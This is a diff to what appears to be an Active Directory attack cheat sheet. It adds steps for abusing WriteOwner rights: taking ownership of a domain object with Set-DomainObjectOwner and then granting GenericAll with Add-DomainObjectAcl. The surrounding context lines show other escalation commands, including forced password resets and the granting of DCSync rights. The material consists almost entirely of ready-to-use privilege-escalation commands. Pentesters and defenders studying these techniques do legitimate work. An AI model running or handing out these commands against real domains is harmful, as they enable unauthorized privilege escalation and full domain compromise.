@@ -266,6 +266,8 @@ Get-ObjectAcl -SamAccountName <TARGET USER> -ResolveGUIDs | ? {$_.SecurityIdenti
 - In case you have a GenericAll permission on a Group, Write permission, Write-Owner permission or Self permission, you can
   - Add yourself to this group, and as a result obtain the privileges that this group possesses.
 
+- In case you have WriteOwner permissions you can add a owner to the object.
+
 #### Reset password of a user
 ```
 net user <USERNAME> <PASSWORD> /domain
@@ -305,6 +307,22 @@ Set-DomainObject -Identity <USERNAME> -XOR @{useraccountcontrol=4194304} -Verbos
 - When writedacl on domain object
 ```
 Add-DomainObjectAcl -TargetIdentity 'DC=<PARENT DOMAIN>,DC=<TOP DOMAIN>' -PrincipalIdentity '<CHILD DOMAIN>\<USER>' -Rights DCSync -Verbose
+```
+
+#### Change owner
+- When writeowner
+```
+Set-DomainObjectOwner -Credential $creds -Identity <OBJECT FQDN OR SID> -OwnerIdentity <NEW OWNER>
+
+Get-ObjectAcl -Identity bank-dc.els.bank -ResolveGUIDs | Where-Object -Property SecurityIdentifier -Match <SID NEW OWNER>
+```
+
+#### Add GenericAll
+- When owner of an object
+```
+Add-DomainObjectAcl -Credential $creds -TargetIdentity "<OBJECT FQDN OR SID>" -Rights all -PrincipalIdentity <USER WHO GETS GENERIC ALL> -Verbose
+
+Get-ObjectAcl -Identity "<OBJECT FQDN OR SID>" -ResolveGUIDs | Where-Object -Property SecurityIdentifier -Match <SID OF USER WHO GETS GENERIC ALL>
 ```
 
 #### NTLMRelay
